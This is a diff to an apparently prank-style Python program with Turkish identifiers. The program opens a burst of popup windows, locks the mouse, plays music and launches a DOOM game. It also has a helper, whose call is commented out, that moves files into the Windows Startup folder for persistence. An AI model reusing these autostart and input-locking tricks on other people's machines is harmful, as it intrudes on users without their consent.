@@ -1,3 +1,4 @@
+import time
 from threading import Thread
 import os
 from playsound import playsound
@@ -23,7 +24,7 @@ def BaslangicaTasi(TasinacakDosya):
     removeFromLast = 7
     hedefKonum = os.path.expanduser('~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
     oradaMi = hedefKonum + "/" + TasinacakDosya
-    aramaSonucu = find(TasinacakDosya, "C:")    
+    aramaSonucu = find(TasinacakDosya, "C:")
     if(aramaSonucu != None):
         if not os.path.isfile(oradaMi):
             tumDosyalar = os.listdir(aramaSonucu[:-removeFromLast])
@@ -34,9 +35,11 @@ def BaslangicaTasi(TasinacakDosya):
         if not os.path.isfile(oradaMi):
             tumDosyalar = os.listdir(aramaSonucu[:-removeFromLast])
             for herBirDosya in tumDosyalar:
-                shutil.move(os.path.join(aramaSonucu[:-removeFromLast], herBirDosya), hedefKonum)    
+                shutil.move(os.path.join(aramaSonucu[:-removeFromLast], herBirDosya), hedefKonum)
 
 #BaslangicaTasi("DOOM.py")   bunu açınca dosyaları taşıyor ama oyun çalışmıyor
+
+loopforDelay = True
 
 def Yazilar():
     playsound('DOOM/music.wav', block=False)
@@ -44,10 +47,20 @@ def Yazilar():
     for i in range(0, 29):
         Thread(target= first.aciklamaSekmesi).start()
     first.sonSekme()
+    global loopforDelay
+    loopforDelay = False
+    Thread(target=mouseDelayedRelease).start()
+    Thread(target=startGame).start()
+
+def mouseDelayedRelease():
+    while(loopforDelay):
+        continue
+    time.sleep(1)
     global fareyiKilitle
     fareyiKilitle = False
-    os.system('python DOOM/main.py')
 
+def startGame():
+    os.system('python DOOM/main.py')
 
 def Lock():
     fromPy = open("DOOM/lock.py", 'r')
